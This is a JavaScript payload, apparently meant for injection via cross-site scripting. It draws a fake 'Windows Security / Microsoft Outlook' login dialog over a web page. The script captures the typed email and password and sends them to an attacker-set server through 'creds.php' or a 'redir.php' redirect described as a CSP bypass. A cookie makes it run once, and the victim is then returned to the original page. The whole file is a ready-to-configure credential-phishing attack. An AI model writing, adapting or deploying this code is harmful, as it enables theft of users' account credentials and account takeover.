// >>>>> !!! CHANGE THIS !!! >>>>>
let attWsPhishPath = 'http://192.168.5.5/'; // PUT TRAILING SLASH
let bypassCSP = false;
let runOnce = true;
// <<<<< <<<<< <<<<< <<<<< <<<<<
const phishHtml = `
<style>
  .button73 {
    width: 190px;
    height: 30px;
    background-color: #A9A9A9;
    border: none;
    color: black;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 14px;
    margin: 4px 2px;
    cursor: pointer;
  }
  .textbox73 {
    height: 26px;
    background-color: #E5E5E5;
    color: black;
    text-indent: 5px;
    border: 1px solid black;
  }
  .textbox73:focus {
    background-color: white;
    border: 1px solid #0080FF;
    box-shadow: none;
    outline: none;
  }
  .checkbox73 input {
    display: none;
  }
  .checkbox73 .checkmark73 {
    position: relative;
    display: inline-block;
    margin-left: 4px;
    margin-top: 4px;
    height: 14px;
    width: 14px;
    background-color: #E5E5E5;
    border: 2px solid black;
  }
  .checkbox73 .checkmark73:after {
    content: "";
    position: absolute;
    display: none;
    left: 4px;
    top: 0px;
    width: 5px;
    height: 8px;
    border: solid black;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
  }
  .checkbox73 input:checked ~ .checkmark73:after {
    display: block;
  }
</style>
<div id="bg" style="position: fixed; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.6; top: 0; left: 0; margin: 0;">
</div>
<div id="credsform" style="position: fixed; z-index: 101; top: 30%; left: 50%; transform: translate(-50%); width: 420px; height: 300px; padding: 0px; background-color: #D2D2D2; border:1px solid black; font-family: Calibri, sans-serif; font-size: 12px;">
  <p style="margin-left: 12px; margin-top: 8px; font-size: 10px; user-select: none;">Windows Security</p>
  <p style="margin-left: 12px; margin-top: 14px; font-size: 18px; user-select: none;">Microsoft Outlook</p>
  <p style="margin-left: 12px; margin-top: 18px; font-size: 12px; user-select: none;">Connecting to outlook.office365.com</p>
  <form onsubmit="return false;">
    <p style="margin-left: 12px; margin-top: 16px;"><input class="textbox73" type="text" name="username" id="username" placeholder="Email address" size="32" autofocus></p>
    <p style="margin-left: 12px; margin-top: 10px;"><input class="textbox73" type="password" name="password" id="password" placeholder="Password" size="32"></p>
    <p style="margin-left: 8px; margin-top: 14px; user-select: none;"><label class="checkbox73"><input type="checkbox" name="checkbox" id="checkbox"><span class="checkmark73"></span></label><label style="margin-left: 6px; font-size: 12px; vertical-align: super;">Remember my credentials</label></p>
    <p style="margin-left: 12px; margin-top: 30px;"><input class="button73" type="button" name="okbutton" id="okbutton" value="OK" onclick="submitLoginForm()"><input class="button73" type="button" value="Cancel" onclick="submitLoginForm()"></p>
  </form>
</div> `;
async function getURL(url) {
  return await fetch(url, {mode: "no-cors"});
}
async function submitLoginForm() {
  let username = document.getElementById('username').value;
  let password = document.getElementById('password').value;
  let redirURL = window.location.protocol + '//' + window.location.hostname + window.location.pathname;
  // [CASE] CSP BYPASS REQUIRED
  if (bypassCSP) {
    document.location = attWsPhishPath + 'redir.php?user=' + username + '&pass=' + password + '&redir=' + redirURL;
  }
  // [CASE] CSP BYPASS NOT REQUIRED
  else {
    await this.getURL(attWsPhishPath + 'creds.php?user=' + username + '&pass=' + password);
    window.open(redirURL, '_self');
  }
}
function execPayld() {
  let phishDiv = document.createElement('div');
  phishDiv.innerHTML = phishHtml;
  document.getElementsByTagName('body')[0].appendChild(phishDiv);
  document.getElementById('password').addEventListener('keyup', event => {
    if(event.key !== 'Enter') return;
    document.getElementById('okbutton').click();
    event.preventDefault();
  });
}
// [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
  let cookExp = new Date();
  cookExp.setFullYear(cookExp.getFullYear() + 1);
  let cook = 'winPhi=true; path=/; expires=' + cookExp.toUTCString();
  document.cookie = cook;
  execPayld();
}
// [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
if (!runOnce) {
  execPayld();
}
// EoF
